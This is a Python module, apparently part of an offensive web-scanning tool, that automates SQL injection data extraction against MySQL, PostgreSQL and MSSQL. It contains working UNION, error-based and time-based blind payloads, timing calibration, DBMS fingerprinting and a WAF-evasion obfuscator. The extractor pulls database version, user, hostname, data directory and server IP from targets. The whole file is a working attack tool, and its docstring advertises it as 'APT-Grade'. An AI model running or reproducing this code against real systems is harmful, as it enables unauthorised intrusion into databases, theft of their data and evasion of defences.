"""
SQLi Data Extractor — UNION (fast) + Blind Binary Search (deep).

APT-Grade Enhancements:
- Dynamic Baseline Latency Calibration (eliminates timing false positives)
- Adaptive sleep duration based on network jitter measurement
- WAF-evasive payload encoding (inline comments, case randomization)
- Multi-DBMS fingerprinting with version-specific payloads
- Error-based extraction as intermediate fallback
"""
import re
import time
import random
import asyncio
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
from core.ui import w


class SQLiExtractor:
    DBMS_QUERIES = {
        "mysql": {
            "version": "VERSION()",
            "database": "DATABASE()",
            "user": "USER()",
            "hostname": "@@hostname",
            "datadir": "@@datadir",
        },
        "postgresql": {
            "version": "VERSION()",
            "database": "CURRENT_DATABASE()",
            "user": "CURRENT_USER",
            "server_ip": "INET_SERVER_ADDR()::TEXT",
        },
        "mssql": {
            "version": "@@VERSION",
            "database": "DB_NAME()",
            "user": "USER_NAME()",
            "servername": "@@SERVERNAME",
        },
    }

    DB_PROBES = {
        "mysql": ("' AND IF(1=1, SLEEP({delay}), 0) -- -", "SLEEP"),
        "postgresql": ("' AND (SELECT 1 FROM PG_SLEEP({delay})) -- -", "PG_SLEEP"),
        "mssql": ("'; WAITFOR DELAY '00:00:0{delay_int}' -- -", "WAITFOR"),
    }

    # Error-based extraction patterns (intermediate fallback)
    ERROR_PAYLOADS = {
        "mysql": [
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, ({query}), 0x7e)) -- -",
            "' AND UPDATEXML(1, CONCAT(0x7e, ({query}), 0x7e), 1) -- -",
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(({query}),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) -- -",
        ],
        "postgresql": [
            "' AND 1=CAST(({query}) AS INT) -- -",
        ],
        "mssql": [
            "' AND 1=CONVERT(INT, ({query})) -- -",
        ],
    }

    # WAF Evasion: inline comment obfuscation
    @staticmethod
    def _obfuscate(payload: str) -> str:
        """Apply random inline MySQL comments for WAF bypass."""
        keywords = ["AND", "OR", "SELECT", "UNION", "FROM", "WHERE", "ORDER", "BY",
                     "SLEEP", "IF", "CONCAT", "SUBSTR", "ASCII", "LENGTH", "NULL"]
        result = payload
        for kw in keywords:
            if kw in result.upper():
                # Randomly decide to obfuscate this keyword
                if random.random() > 0.5:
                    obfuscated = "/*!50000" + kw + "*/"
                    result = re.sub(r'\b' + kw + r'\b', obfuscated, result, count=1, flags=re.I)
        return result

    def __init__(self, engine, session_manager=None):
        self.engine = engine
        self.session_manager = session_manager
        self.db_type = "mysql"
        self._baseline_latency = 0.0
        self._calibrated = False
        self._sleep_duration = 5  # Default, overridden after calibration

    def _inject(self, url, param, payload):
        parts = urlparse(url)
        query = parse_qsl(parts.query, keep_blank_values=True)
        found = False
        for i, (k, v) in enumerate(query):
            if k == param:
                query[i] = (k, payload)
                found = True
                break
        if not found:
            query.append((param, payload))
        return urlunparse((parts.scheme, parts.netloc, parts.path,
                           urlencode(query), parts.fragment))

    async def _send(self, url, param, payload, timeout=10, obfuscate=False):
        if obfuscate:
            payload = self._obfuscate(payload)
        return await self.engine.ahttp_send(
            self._inject(url, param, payload),
            timeout=timeout,
            state_context=self.session_manager,
        )

# BASELINE LATENCY CALIBRATION

    async def _calibrate_baseline(self, url: str, param: str):
        """
        Measure target's natural response time with 3 safe requests.
        This eliminates false positives from network jitter.

        Strategy:
        - Send 3 benign requests with safe values
        - Calculate average + max latency
        - Set sleep duration = max(average * 2 + 3, 5) seconds
        - Set detection threshold = baseline_max + sleep_duration * 0.6
        """
        if self._calibrated:
            return

        latencies = []
        for _ in range(3):
            safe_val = str(random.randint(1, 9999))
            t0 = time.time()
            try:
                r = await self._send(url, param, safe_val, timeout=8)
                elapsed = r.get("time", time.time() - t0) if isinstance(r, dict) else time.time() - t0
            except Exception as e:
                elapsed = time.time() - t0
                w(f"SQLi calibration request failed: {str(e)[:60]}")
            latencies.append(elapsed)
            await asyncio.sleep(0.1)  # Small gap between calibration pings

        avg_latency = sum(latencies) / len(latencies)
        max_latency = max(latencies)
        jitter = max_latency - min(latencies)

        self._baseline_latency = avg_latency
        self._baseline_max = max_latency
        self._baseline_jitter = jitter

        # Dynamic sleep: must be clearly distinguishable from natural response time
        # Minimum 5 seconds, but scale up for slow/jittery targets
        self._sleep_duration = max(5, int(avg_latency * 2 + 3))

        # Detection threshold: response must exceed this to count as "delayed"
        # accounts for worst-case natural latency + buffer
        self._detection_threshold = max_latency + (self._sleep_duration * 0.6)

        self._calibrated = True

# DATABASE FINGERPRINTING

    async def detect_db(self, url, param):
        """Fingerprint DBMS using calibrated timing attacks."""
        await self._calibrate_baseline(url, param)

        for db, (payload_tpl, _) in self.DB_PROBES.items():
            try:
                payload = payload_tpl.format(
                    delay=self._sleep_duration,
                    delay_int=self._sleep_duration,
                )
                r = await self._send(url, param, payload,
                                     timeout=self._sleep_duration + 8,
                                     obfuscate=True)
                resp_time = r.get("time", 0) if isinstance(r, dict) else 0

                if resp_time >= self._detection_threshold:
                    self.db_type = db
                    return db
            except Exception as e:
                w(f"SQLi DB detect request failed for {db}: {str(e)[:60]}")
                continue
        return "mysql"

# UNION-BASED EXTRACTION

    async def _detect_columns(self, url, param):
        for n in range(1, 31):
            r = await self._send(url, param, f"' ORDER BY {n}-- -",
                                 timeout=8, obfuscate=True)
            status = r.get("status", 0) if isinstance(r, dict) else 0
            body = (r.get("body") or "").lower() if isinstance(r, dict) else ""
            if status >= 500 or any(e in body for e in [
                "order by", "unknown column", "out of range",
                "order clause", "number of columns",
            ]):
                return n - 1
        return None

    async def union_extract(self, url, param, columns=None):
        findings = []
        if columns is None:
            columns = await self._detect_columns(url, param)
        if not columns or columns < 1:
            return None

        nulls = ",".join(["NULL"] * (columns - 1))
        for name, query in self.DBMS_QUERIES.get(self.db_type, self.DBMS_QUERIES["mysql"]).items():
            try:
                payload = f"' UNION SELECT {nulls},{query}-- -"
                r = await self._send(url, param, payload, timeout=10, obfuscate=True)
                body = (r.get("body") or "") if isinstance(r, dict) else ""
                if not body:
                    continue

                value = None
                # Look for data that wasn't in the original page
                for pat in [r'[\d]+\.[\d]+\.[\d]+', r'[\w]+@[\w.%]+', r'.{1,64}']:
                    m = re.search(pat, body[:500])
                    if m and len(m.group()) > 2 and m.group() not in ("NULL", "null", "None"):
                        value = m.group()
                        break
                if value:
                    findings.append({
                        "type": "sqli_extracted", "title": f"SQLi UNION: {name}",
                        "url": url[:200],
                        "detail": f"DBMS: {self.db_type.upper()}, {name} = {value}",
                        "param": param, "method": "UNION", "confidence": "confirmed",
                    })
            except Exception as e:
                w(f"SQLi UNION request failed for {name}: {str(e)[:60]}")
                continue
        return findings or None

# ERROR-BASED EXTRACTION (intermediate fallback)

    async def error_extract(self, url, param):
        """Extract data via database error messages (faster than blind)."""
        findings = []
        payloads = self.ERROR_PAYLOADS.get(self.db_type, self.ERROR_PAYLOADS["mysql"])
        queries = self.DBMS_QUERIES.get(self.db_type, self.DBMS_QUERIES["mysql"])

        for name, query in queries.items():
            for payload_tpl in payloads:
                try:
                    payload = payload_tpl.format(query=query)
                    r = await self._send(url, param, payload, timeout=10, obfuscate=True)
                    body = (r.get("body") or "") if isinstance(r, dict) else ""
                    if not body:
                        continue

                    # Extract value between markers (0x7e = ~)
                    m = re.search(r'~([^~]{2,80})~', body)
                    if m:
                        value = m.group(1)
                        findings.append({
                            "type": "sqli_extracted", "title": f"SQLi Error: {name}",
                            "url": url[:200],
                            "detail": f"DBMS: {self.db_type.upper()}, {name} = {value}",
                            "param": param, "method": "error-based",
                            "confidence": "confirmed",
                        })
                        break  # Got value for this query, move to next
                except Exception as e:
                    w(f"SQLi Error request failed for {name}: {str(e)[:60]}")
                    continue
        return findings or None

# BLIND TIME-BASED EXTRACTION (calibrated)

    async def _blind_test(self, url, param, condition):
        """
        Time-based blind boolean test with calibrated thresholds.
        Uses dynamic sleep duration and detection threshold from calibration.
        """
        payloads = {
            "mysql": f"' AND IF({condition}, SLEEP({self._sleep_duration}), 0) -- -",
            "postgresql": f"' AND (SELECT CASE WHEN ({condition}) THEN PG_SLEEP({self._sleep_duration}) ELSE PG_SLEEP(0) END) -- -",
            "mssql": f"'; IF ({condition}) WAITFOR DELAY '00:00:0{self._sleep_duration}' -- -",
        }
        payload = payloads.get(self.db_type, payloads["mysql"])
        r = await self._send(url, param, payload,
                             timeout=self._sleep_duration + 8,
                             obfuscate=True)
        resp_time = r.get("time", 0) if isinstance(r, dict) else 0
        return resp_time >= self._detection_threshold

    async def _blind_extract_one(self, url, param, query, max_len=50):
        length = 0
        len_fn = "LEN" if self.db_type == "mssql" else "LENGTH"
        for i in range(1, max_len + 1):
            if await self._blind_test(url, param, f"{len_fn}({query}) >= {i}"):
                length = i
            else:
                break
        if not length:
            return ""

        result = ""
        substr_fn = "SUBSTRING" if self.db_type in ("mysql", "mssql") else "SUBSTR"
        for pos in range(1, length + 1):
            low, high = 32, 126
            while low <= high:
                mid = (low + high) // 2
                if await self._blind_test(
                    url, param,
                    f"ASCII({substr_fn}({query},{pos},1)) > {mid}",
                ):
                    low = mid + 1
                else:
                    high = mid - 1
            result += chr(low)
        return result

    async def blind_extract(self, url, param):
        findings = []
        db = await self.detect_db(url, param)
        for name, query in self.DBMS_QUERIES.get(db, self.DBMS_QUERIES["mysql"]).items():
            val = await self._blind_extract_one(url, param, query)
            if val:
                findings.append({
                    "type": "sqli_extracted", "title": f"SQLi Blind: {name}",
                    "url": url[:200],
                    "detail": f"DBMS: {db.upper()}, {name} = {val}",
                    "param": param, "method": "blind",
                    "confidence": "confirmed",
                })
        return findings

# FULL EXTRACTION CHAIN (UNION → Error → Blind)

    async def extract(self, url, param):
        """
        Full extraction chain with 3-tier fallback:
        1. UNION (fastest, ~1 request per field)
        2. Error-based (fast, ~1-3 requests per field)
        3. Blind time-based (slow but reliable, ~7 requests per character)
        """
        if not url or not param:
            return []

        # Always calibrate first
        await self._calibrate_baseline(url, param)

        # Tier 1: UNION extraction (fastest)
        findings = await self.union_extract(url, param)
        if findings:
            return findings

        # Tier 2: Error-based extraction (intermediate)
        findings = await self.error_extract(url, param)
        if findings:
            return findings

        # Tier 3: Blind time-based (slowest, most reliable)
        return await self.blind_extract(url, param)
